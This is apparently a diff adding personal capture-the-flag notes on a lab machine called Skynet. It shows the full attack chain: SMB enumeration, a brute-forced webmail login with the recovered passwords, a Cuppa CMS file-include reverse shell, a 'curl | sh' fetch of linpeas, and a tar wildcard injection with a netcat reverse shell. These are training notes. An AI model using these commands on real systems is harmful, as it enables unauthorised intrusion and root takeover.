@@ -522,3 +522,673 @@ Finished
 
 #interesting found squirrel mail dir as well as /admin
 
+
+enum4linux output:
+
+
+
+┌──(kali㉿kali)-[~]
+└─$ ping -c 4 10.10.188.99       
+PING 10.10.188.99 (10.10.188.99) 56(84) bytes of data.
+64 bytes from 10.10.188.99: icmp_seq=1 ttl=63 time=91.1 ms
+64 bytes from 10.10.188.99: icmp_seq=2 ttl=63 time=98.9 ms
+64 bytes from 10.10.188.99: icmp_seq=4 ttl=63 time=98.6 ms
+
+--- 10.10.188.99 ping statistics ---
+4 packets transmitted, 3 received, 25% packet loss, time 3270ms
+rtt min/avg/max/mdev = 91.063/96.202/98.911/3.635 ms
+ 
+┌──(kali㉿kali)-[~]
+└─$ enum4linux -a 10.10.188.99
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Apr 22 14:36:09 2025
+
+    
+Target ........... 10.10.188.99                                                                                                                     
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ============================( Enumerating Workgroup/Domain on 10.10.188.99 )============================
+             
+[+] Got domain/workgroup name: WORKGROUP                                                                                                            
+                                        
+ ================================( Nbtstat Information for 10.10.188.99 )================================
+                            
+Looking up status of 10.10.188.99                                                                                                                   
+        SKYNET          <00> -         B <ACTIVE>  Workstation Service
+        SKYNET          <03> -         B <ACTIVE>  Messenger Service
+        SKYNET          <20> -         B <ACTIVE>  File Server Service
+        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
+        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
+        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
+        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
+
+        MAC Address = 00-00-00-00-00-00
+
+ ===================================( Session Check on 10.10.188.99 )===================================
+    
+[+] Server 10.10.188.99 allows sessions using username '', password ''                                                                              
+    
+ ================================( Getting domain SID for 10.10.188.99 )================================
+                                
+Domain Name: WORKGROUP                                                                                                                              
+Domain Sid: (NULL SID)
+
+[+] Can't determine if host is part of domain or part of a workgroup                                                                                
+        
+ ===================================( OS information on 10.10.188.99 )===================================
+                         
+[E] Can't get OS info with smbclient                                                                                                                  
+[+] Got OS info for 10.10.188.99 from srvinfo:                                                                                                      
+        SKYNET         Wk Sv PrQ Unx NT SNT skynet server (Samba, Ubuntu)                                                                           
+        platform_id     :       500
+        os version      :       6.1
+        server type     :       0x809a03
+
+
+ =======================================( Users on 10.10.188.99 )=======================================
+  
+index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: milesdyson       Name:   Desc:                                                                       
+
+user:[milesdyson] rid:[0x3e8]
+
+ =================================( Share Enumeration on 10.10.188.99 )=================================
+   
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        anonymous       Disk      Skynet Anonymous Share
+        milesdyson      Disk      Miles Dyson Personal Share
+        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
+Reconnecting with SMB1 for workgroup listing.
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            SKYNET
+
+[+] Attempting to map shares on 10.10.188.99                                                                                                 
+//10.10.188.99/print$   Mapping: DENIED Listing: N/A Writing: N/A                                                                                   
+//10.10.188.99/anonymous        Mapping: OK Listing: OK Writing: N/A
+//10.10.188.99/milesdyson       Mapping: DENIED Listing: N/A Writing: N/A
+
+[E] Can't understand response:                                                                                                                      
+NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                          
+//10.10.188.99/IPC$     Mapping: N/A Listing: N/A Writing: N/A
+
+ ============================( Password Policy Information for 10.10.188.99 )============================
+
+[+] Attaching to 10.10.188.99 using a NULL share
+
+[+] Trying protocol 139/SMB...
+
+[+] Found domain(s):
+
+        [+] SKYNET
+        [+] Builtin
+
+[+] Password Info for Domain: SKYNET
+
+        [+] Minimum password length: 5
+        [+] Password history length: None
+        [+] Maximum password age: 37 days 6 hours 21 minutes 
+        [+] Password Complexity Flags: 000000
+
+                [+] Domain Refuse Password Change: 0
+                [+] Domain Password Store Cleartext: 0
+                [+] Domain Password Lockout Admins: 0
+                [+] Domain Password No Clear Change: 0
+                [+] Domain Password No Anon Change: 0
+                [+] Domain Password Complex: 0
+
+        [+] Minimum password age: None
+        [+] Reset Account Lockout Counter: 30 minutes 
+        [+] Locked Account Duration: 30 minutes 
+        [+] Account Lockout Threshold: None
+        [+] Forced Log off Time: 37 days 6 hours 21 minutes 
+
+
+
+[+] Retieved partial password policy with rpcclient:                                                                                
+Password Complexity: Disabled                                                                                                                       
+Minimum Password Length: 5
+
+
+ =======================================( Groups on 10.10.188.99 )=======================================
+
+[+] Getting builtin groups:                                                                                                                         
+
+[+]  Getting builtin group memberships:                                                                                                             
+[+]  Getting local groups:                                                                                                                           
+[+]  Getting local group memberships:                                                                                                               
+[+]  Getting domain groups:                                                                                                                  
+[+]  Getting domain group memberships:                                                                                             
+ ==================( Users on 10.10.188.99 via RID cycling (RIDS: 500-550,1000-1050) )==================
+
+[I] Found new SID:                                                                                                                                  
+S-1-22-1                                                                                                                                            
+
+[I] Found new SID:                                                                                                                                  
+S-1-5-32                                                                                                                                            
+
+[I] Found new SID:                                                                                                                                  
+S-1-5-32                                                                                                                                            
+
+[I] Found new SID:                                                                                                                                  
+S-1-5-32                                                                                                                                            
+
+[I] Found new SID:                                                                                                                                  
+S-1-5-32                                                                                                                                            
+
+[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                    
+S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                                   
+S-1-5-32-545 BUILTIN\Users (Local Group)
+S-1-5-32-546 BUILTIN\Guests (Local Group)
+S-1-5-32-547 BUILTIN\Power Users (Local Group)
+S-1-5-32-548 BUILTIN\Account Operators (Local Group)
+S-1-5-32-549 BUILTIN\Server Operators (Local Group)
+S-1-5-32-550 BUILTIN\Print Operators (Local Group)
+
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                         
+ 
+S-1-22-1-1001 Unix User\milesdyson (Local User)                                                                                                     
+
+[+] Enumerating users using SID S-1-5-21-2393614426-3774336851-1116533619 and logon username '', password ''                                            
+S-1-5-21-2393614426-3774336851-1116533619-501 SKYNET\nobody (Local User)                                                                            
+S-1-5-21-2393614426-3774336851-1116533619-513 SKYNET\None (Domain Group)
+S-1-5-21-2393614426-3774336851-1116533619-1000 SKYNET\milesdyson (Local User)
+
+ ===============================( Getting printer info for 10.10.188.99 )=============================== 
+No printers returned.                                                                                                                               
+
+
+enum4linux complete on Tue Apr 22 14:43:59 2025
+----------------------------------------------------------------------------------------------------------
+
+  the Nmap scan earlier said on port 445 it was running Samba smbd 3.X - 4.X which upon googling has known vulnerabilities. I tried this one I saw online but couldn't get the shell to pop.
+
+----------------------------------------------------------------------------------------------------------
+
+msf6 exploit(multi/samba/usermap_script) > show options
+
+Module options (exploit/multi/samba/usermap_script):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CHOST                     no        The local client address
+   CPORT                     no        The local client port
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS   10.10.188.99     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/bas
+                                       ics/using-metasploit.html
+   RPORT    139              yes       The target port (TCP)
+
+
+Payload options (cmd/unix/reverse):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.23.80.154     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/samba/usermap_script) > exploit
+[*] Started reverse TCP double handler on 10.23.80.154:4444 
+[*] Exploit completed, but no session was created.
+msf6 exploit(multi/samba/usermap_script) > unset all
+Unsetting datastore...
+msf6 exploit(multi/samba/usermap_script) > 
+
+safe to say I continued enumerating samba
+
+┌──(kali㉿kali)-[~]
+└─$ smbclient -L 10.10.188.99
+Password for [WORKGROUP\kali]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        anonymous       Disk      Skynet Anonymous Share
+        milesdyson      Disk      Miles Dyson Personal Share
+        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
+Reconnecting with SMB1 for workgroup listing.
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            SKYNET
+            
+┌──(kali㉿kali)-[~]
+└─$ smbclient \\\\10.10.188.99\\Workshares
+Password for [WORKGROUP\kali]:
+tree connect failed: NT_STATUS_BAD_NETWORK_NAME
+                                                                        
+└─$ smbclient \\\\10.10.188.99\\IPC$      
+Password for [WORKGROUP\kali]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
+smb: \> help
+?              allinfo        altname        archive        backup         
+blocksize      cancel         case_sensitive cd             chmod          
+chown          close          del            deltree        dir            
+du             echo           exit           get            getfacl        
+geteas         hardlink       help           history        iosize         
+lcd            link           lock           lowercase      ls             
+l              mask           md             mget           mkdir          
+mkfifo         more           mput           newer          notify         
+open           posix          posix_encrypt  posix_open     posix_mkdir    
+posix_rmdir    posix_unlink   posix_whoami   print          prompt         
+put            pwd            q              queue          quit           
+readlink       rd             recurse        reget          rename         
+reput          rm             rmdir          showacls       setea          
+setmode        scopy          stat           symlink        tar            
+tarmode        timeout        translate      unlock         volume         
+vuid           wdel           logon          listconnect    showconnect    
+tcon           tdis           tid            utimes         logoff         
+..             !              
+smb: \> dir
+NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
+smb: \> ls
+NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
+smb: \> pwd
+Current directory is \\10.10.188.99\IPC$\
+smb: \> 
+
+I'm a little lost so I went into the share that was listed as OK for mapping in the enum4linux scan. \anonymous
+
+┌──(kali㉿kali)-[~]
+└─$ smbclient \\\\10.10.188.99\\anonymous
+Password for [WORKGROUP\kali]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Thu Nov 26 11:04:00 2020
+  ..                                  D        0  Tue Sep 17 03:20:17 2019
+  attention.txt                       N      163  Tue Sep 17 23:04:59 2019
+  logs                                D        0  Wed Sep 18 00:42:16 2019
+
+                9204224 blocks of size 1024. 5831508 blocks available
+smb: \> cat attention.txt
+cat: command not found
+smb: \> help
+?              allinfo        altname        archive        backup         
+blocksize      cancel         case_sensitive cd             chmod          
+chown          close          del            deltree        dir            
+du             echo           exit           get            getfacl        
+geteas         hardlink       help           history        iosize         
+lcd            link           lock           lowercase      ls             
+l              mask           md             mget           mkdir          
+mkfifo         more           mput           newer          notify         
+open           posix          posix_encrypt  posix_open     posix_mkdir    
+posix_rmdir    posix_unlink   posix_whoami   print          prompt         
+put            pwd            q              queue          quit           
+readlink       rd             recurse        reget          rename         
+reput          rm             rmdir          showacls       setea          
+setmode        scopy          stat           symlink        tar            
+tarmode        timeout        translate      unlock         volume         
+vuid           wdel           logon          listconnect    showconnect    
+tcon           tdis           tid            utimes         logoff         
+..             !              
+smb: \> echo attention.txt
+echo <num> <data>
+smb: \> ls -la
+NT_STATUS_NO_SUCH_FILE listing \-la
+smb: \> ls
+  .                                   D        0  Thu Nov 26 11:04:00 2020
+  ..                                  D        0  Tue Sep 17 03:20:17 2019
+  attention.txt                       N      163  Tue Sep 17 23:04:59 2019
+  logs                                D        0  Wed Sep 18 00:42:16 2019
+
+                9204224 blocks of size 1024. 5831508 blocks available
+smb: \> get attention.txt
+getting file \attention.txt of size 163 as attention.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
+smb: \> ls
+  .                                   D        0  Thu Nov 26 11:04:00 2020
+  ..                                  D        0  Tue Sep 17 03:20:17 2019
+  attention.txt                       N      163  Tue Sep 17 23:04:59 2019
+  logs                                D        0  Wed Sep 18 00:42:16 2019
+
+                9204224 blocks of size 1024. 5831504 blocks available
+smb: \> get logs
+NT_STATUS_FILE_IS_A_DIRECTORY opening remote file \logs
+smb: \> ^C
+
+┌──(kali㉿kali)-[~]
+└─$ cat attention.txt
+A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
+-Miles Dyson
+
+
+upon reading the downloaded attention.txt file I felt thrown off and not much closer to getting any passwords or access so I must do more digging
+
+smb: \> cd logs
+smb: \logs\> ls
+  .                                   D        0  Wed Sep 18 00:42:16 2019
+  ..                                  D        0  Thu Nov 26 11:04:00 2020
+  log2.txt                            N        0  Wed Sep 18 00:42:13 2019
+  log1.txt                            N      471  Wed Sep 18 00:41:59 2019
+  log3.txt                            N        0  Wed Sep 18 00:42:16 2019
+
+                9204224 blocks of size 1024. 5831492 blocks available
+smb: \logs\> get log1.txt
+getting file \logs\log1.txt of size 471 as log1.txt (1.2 KiloBytes/sec) (average 1.2 KiloBytes/sec)
+smb: \logs\> get log2.txt
+getting file \logs\log2.txt of size 0 as log2.txt (0.0 KiloBytes/sec) (average 0.7 KiloBytes/sec)
+smb: \logs\> get log3.txt
+getting file \logs\log3.txt of size 0 as log3.txt (0.0 KiloBytes/sec) (average 0.4 KiloBytes/sec)
+smb: \logs\> 
+
+log1.txt appears to be a list of cleartext passwords that can maybe used in a wordlist attack. I have a couple different users enumerated. 
+
+S-1-5-21-2393614426-3774336851-1116533619-501 SKYNET\nobody (Local User)                                                                            
+S-1-5-21-2393614426-3774336851-1116533619-513 SKYNET\None (Domain Group)
+S-1-5-21-2393614426-3774336851-1116533619-1000 SKYNET\milesdyson (Local User)
+
+so those can be potential usernames could be used with the password list. As opposed to hydra, which I may need to try depending on how this goes. I went with burpsuite intruder loading in log1.txt as the wordlist and milesdyson as the username, currently I do not believe I have found a correct combination of those two
+
+Okay that found dyson's password: cyborg007haloterminator as that one got a 302 response
+
+upon logging into his email we see the following email:
+
+![[Pasted image 20250422162702.png]]
+
+SMB Password: )s{A&2Z=F^n_E.B`
+
+┌──(kali㉿kali)-[~]
+└─$ smbclient  \\\\10.10.188.99\\milesdyson -U milesdyson
+Password for [WORKGROUP\milesdyson]:
+Try "help" to get a list of possible commands.
+smb: \> 
+
+when prompted for the password I used the one found in 10.10.188.99/squirrelmail
+
+
+                9204224 blocks of size 1024. 5831380 blocks available
+smb: \> ls
+  .                                   D        0  Tue Sep 17 05:05:47 2019
+  ..                                  D        0  Tue Sep 17 23:51:03 2019
+  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 05:05:14 2019
+  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 05:05:14 2019
+  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 05:05:14 2019
+  notes                               D        0  Tue Sep 17 05:18:40 2019
+  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 05:05:14 2019
+  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 05:05:14 2019
+
+                9204224 blocks of size 1024. 5831380 blocks available
+smb: \> pwd
+Current directory is \\10.10.188.99\milesdyson\
+smb: \> cd notes
+smb: \notes\> dir
+  .                                   D        0  Tue Sep 17 05:18:40 2019
+  ..                                  D        0  Tue Sep 17 05:05:47 2019
+  3.01 Search.md                      N    65601  Tue Sep 17 05:01:29 2019
+  4.01 Agent-Based Models.md          N     5683  Tue Sep 17 05:01:29 2019
+  2.08 In Practice.md                 N     7949  Tue Sep 17 05:01:29 2019
+  0.00 Cover.md                       N     3114  Tue Sep 17 05:01:29 2019
+  1.02 Linear Algebra.md              N    70314  Tue Sep 17 05:01:29 2019
+  important.txt                       N      117  Tue Sep 17 05:18:39 2019
+  6.01 pandas.md                      N     9221  Tue Sep 17 05:01:29 2019
+  3.00 Artificial Intelligence.md      N       33  Tue Sep 17 05:01:29 2019
+  2.01 Overview.md                    N     1165  Tue Sep 17 05:01:29 2019
+  3.02 Planning.md                    N    71657  Tue Sep 17 05:01:29 2019
+  1.04 Probability.md                 N    62712  Tue Sep 17 05:01:29 2019
+  2.06 Natural Language Processing.md      N    82633  Tue Sep 17 05:01:29 2019
+  2.00 Machine Learning.md            N       26  Tue Sep 17 05:01:29 2019
+  1.03 Calculus.md                    N    40779  Tue Sep 17 05:01:29 2019
+  3.03 Reinforcement Learning.md      N    25119  Tue Sep 17 05:01:29 2019
+  1.08 Probabilistic Graphical Models.md      N    81655  Tue Sep 17 05:01:29 2019
+  1.06 Bayesian Statistics.md         N    39554  Tue Sep 17 05:01:29 2019
+  6.00 Appendices.md                  N       20  Tue Sep 17 05:01:29 2019
+  1.01 Functions.md                   N     7627  Tue Sep 17 05:01:29 2019
+  2.03 Neural Nets.md                 N   144726  Tue Sep 17 05:01:29 2019
+  2.04 Model Selection.md             N    33383  Tue Sep 17 05:01:29 2019
+  2.02 Supervised Learning.md         N    94287  Tue Sep 17 05:01:29 2019
+  4.00 Simulation.md                  N       20  Tue Sep 17 05:01:29 2019
+  3.05 In Practice.md                 N     1123  Tue Sep 17 05:01:29 2019
+  1.07 Graphs.md                      N     5110  Tue Sep 17 05:01:29 2019
+  2.07 Unsupervised Learning.md       N    21579  Tue Sep 17 05:01:29 2019
+  2.05 Bayesian Learning.md           N    39443  Tue Sep 17 05:01:29 2019
+  5.03 Anonymization.md               N     2516  Tue Sep 17 05:01:29 2019
+  5.01 Process.md                     N     5788  Tue Sep 17 05:01:29 2019
+  1.09 Optimization.md                N    25823  Tue Sep 17 05:01:29 2019
+  1.05 Statistics.md                  N    64291  Tue Sep 17 05:01:29 2019
+  5.02 Visualization.md               N      940  Tue Sep 17 05:01:29 2019
+  5.00 In Practice.md                 N       21  Tue Sep 17 05:01:29 2019
+  4.02 Nonlinear Dynamics.md          N    44601  Tue Sep 17 05:01:29 2019
+  1.10 Algorithms.md                  N    28790  Tue Sep 17 05:01:29 2019
+  3.04 Filtering.md                   N    13360  Tue Sep 17 05:01:29 2019
+  1.00 Foundations.md                 N       22  Tue Sep 17 05:01:29 2019
+
+                9204224 blocks of size 1024. 5831380 blocks available
+smb: \notes\> get important.txt
+getting file \notes\important.txt of size 117 as important.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
+smb: \notes\> 
+
+┌──(kali㉿kali)-[~]
+└─$ cat important.txt
+
+1. Add features to beta CMS /45kra24zxs28v3yd
+2. Work on T-800 Model 101 blueprints
+3. Spend more time with my wife
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ 
+
+looks like there is a CMS that can be accessed in this directory
+
+the website at http://10.10.188.99/45kra24zxs28v3yd/ doesn't tell me much whatsoever. I got stuck here for some time and saw an administrator directory in the weird one we enumerated from logging into milesdyson's smb share 
+
+┌──(kali㉿kali)-[~]
+└─$ ffuf -u http://10.10.188.99/45kra24zxs28v3yd/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.188.99/45kra24zxs28v3yd/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+#                       [Status: 200, Size: 418, Words: 45, Lines: 16, Duration: 105ms]
+# Copyright 2007 James Fisher [Status: 200, Size: 418, Words: 45, Lines: 16, Duration: 109ms]
+# directory-list-2.3-medium.txt [Status: 200, Size: 418, Words: 45, Lines: 16, Duration: 109ms]
+# This work is licensed under the Creative Commons  [Status: 200, Size: 418, Words: 45, Lines: 16, Duration: 2634ms]
+# on atleast 2 different hosts [Status: 200, Size: 418, Words: 45, Lines: 16, Duration: 3642ms]
+# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 418, Words: 45, Lines: 16, Duration: 3644ms]
+                        [Status: 200, Size: 418, Words: 45, Lines: 16, Duration: 3647ms]
+# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 418, Words: 45, Lines: 16, Duration: 3649ms]
+# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 418, Words: 45, Lines: 16, Duration: 4654ms]
+# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 418, Words: 45, Lines: 16, Duration: 4654ms]
+#                       [Status: 200, Size: 418, Words: 45, Lines: 16, Duration: 4659ms]
+#                       [Status: 200, Size: 418, Words: 45, Lines: 16, Duration: 4660ms]
+# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 418, Words: 45, Lines: 16, Duration: 4665ms]
+#                       [Status: 200, Size: 418, Words: 45, Lines: 16, Duration: 4665ms]
+administrator           [Status: 301, Size: 337, Words: 20, Lines: 10, Duration: 98ms]
+                        [Status: 200, Size: 418, Words: 45, Lines: 16, Duration: 98ms]
+:: Progress: [220560/220560] :: Job [1/1] :: 404 req/sec :: Duration: [0:09:08] :: Errors: 0 ::
+                     
+
+http://10.10.188.99/45kra24zxs28v3yd/administrator/ and is shown to be a cuppa cms login page
+
+Tried default creds of admin admin but that didn't work
+
+┌──(kali㉿kali)-[~]
+└─$ ffuf -u http://10.10.188.99/45kra24zxs28v3yd/administrator/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.188.99/45kra24zxs28v3yd/administrator/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+# This work is licensed under the Creative Commons  [Status: 200, Size: 4945, Words: 854, Lines: 94, Duration: 99ms]
+# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 4945, Words: 854, Lines: 94, Duration: 104ms]
+# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 4945, Words: 854, Lines: 94, Duration: 104ms]
+# Copyright 2007 James Fisher [Status: 200, Size: 4945, Words: 854, Lines: 94, Duration: 105ms]
+#                       [Status: 200, Size: 4945, Words: 854, Lines: 94, Duration: 107ms]
+#                       [Status: 200, Size: 4945, Words: 854, Lines: 94, Duration: 111ms]
+# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 4945, Words: 854, Lines: 94, Duration: 112ms]
+media                   [Status: 301, Size: 343, Words: 20, Lines: 10, Duration: 98ms]
+templates               [Status: 301, Size: 347, Words: 20, Lines: 10, Duration: 98ms]
+# on atleast 2 different hosts [Status: 200, Size: 4945, Words: 854, Lines: 94, Duration: 1771ms]
+#                       [Status: 200, Size: 4945, Words: 854, Lines: 94, Duration: 1773ms]
+# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 4945, Words: 854, Lines: 94, Duration: 2776ms]
+#                       [Status: 200, Size: 4945, Words: 854, Lines: 94, Duration: 3788ms]
+# directory-list-2.3-medium.txt [Status: 200, Size: 4945, Words: 854, Lines: 94, Duration: 3791ms]
+# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 4945, Words: 854, Lines: 94, Duration: 3790ms]
+                        [Status: 200, Size: 4945, Words: 854, Lines: 94, Duration: 3787ms]
+alerts                  [Status: 301, Size: 344, Words: 20, Lines: 10, Duration: 98ms]
+js                      [Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 97ms]
+components              [Status: 301, Size: 348, Words: 20, Lines: 10, Duration: 95ms]
+classes                 [Status: 301, Size: 345, Words: 20, Lines: 10, Duration: 98ms]
+                        [Status: 200, Size: 4945, Words: 854, Lines: 94, Duration: 106ms]
+
+fuzzing the admin page gives us an alerts folder which an exploit exists for the alerts feature for cuppa https://www.exploit-db.com/exploits/25971
+
+upon reading i realized I could employ the RFI used in practice http://10.10.188.99/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/hosts returns an actual config
+
+┌──(kali㉿kali)-[~]
+└─$ vi php-reverse-shell.php
+                                                                            
+┌──(kali㉿kali)-[~]
+└─$ python3 -m http.server 80           
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.188.99 - - [22/Apr/2025 18:47:52] "GET /php-reverse-shell.php HTTP/1.0" 200 -
+
+http://10.10.188.99/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.23.80.154/php-reverse-shell.php
+
+was entered into the web browser where the exploit db site said it was. I downloaded https://pentestmonkey.net/tools/web-shells/php-reverse-shell?ref=blog.tryhackme.com to create the reverse shell and was able to find the user flag after that
+
+$ cat /home/milesdyson/user.txt
+7ce5c2109a40f958099283600a9ae807
+$ 
+
+┌──(kali㉿kali)-[~]
+└─$ python3 -m http.server 80           
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.188.99 - - [22/Apr/2025 18:47:52] "GET /php-reverse-shell.php HTTP/1.0" 200 -
+10.10.188.99 - - [22/Apr/2025 19:06:34] "GET /linpeas.sh HTTP/1.1" 200 -
+10.10.188.99 - - [22/Apr/2025 19:09:15] "GET /linpeas.sh HTTP/1.1" 200 -
+
+from there I put linpeas on my home directory and wrote on the target "curl 10.23.80.154/linpeas.sh | sh"
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+
+linpeas shows scripts being ran as root
+
+$ cat backup.sh
+#!/bin/bash
+cd /var/www/html
+tar cf /home/milesdyson/backups/backup.tgz *
+$ ls /etc/crontab 
+/etc/crontab
+$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+$ there is a tar script being ran to compress and backup every file in /home/milesdyson/backups
+
+┌──(kali㉿kali)-[~]
+└─$ msfvenom -p cmd/unix/reverse_netcat lhost=10.23.80.154 lport=8888 R
+[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+[-] No arch selected, selecting arch: cmd from the payload
+No encoder specified, outputting raw payload
+Payload size: 98 bytes
+mkfifo /tmp/vhnngg; nc 10.23.80.154 8888 0</tmp/vhnngg | /bin/sh >/tmp/vhnngg 2>&1; rm /tmp/vhnngg
+ 
+┌──(kali㉿kali)-[~]
+└─$ 
+
+
+
+https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
+echo "mkfifo /tmp/lhennp; nc 10.23.80.154 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
+echo "" > "--checkpoint-action=exec=sh shell.sh" 
+echo "" > --checkpoint=1 
+tar cf archive.tar *
+
+┌──(kali㉿kali)-[~]
+└─$ nc -lnvp 8888
+listening on [any] 8888 ...
+connect to [10.23.80.154] from (UNKNOWN) [10.10.188.99] 48614
+sudo su
+ls
+45kra24zxs28v3yd
+admin
+ai
+archive.tar
+--checkpoint=1
+--checkpoint-action=exec=sh shell.sh
+config
+css
+image.png
+index.html
+js
+shell.sh
+style.css
+ls /root
+root.txt
+cat /root/root.txt 
+3f0372db24753accc7179a282cd6a949
+
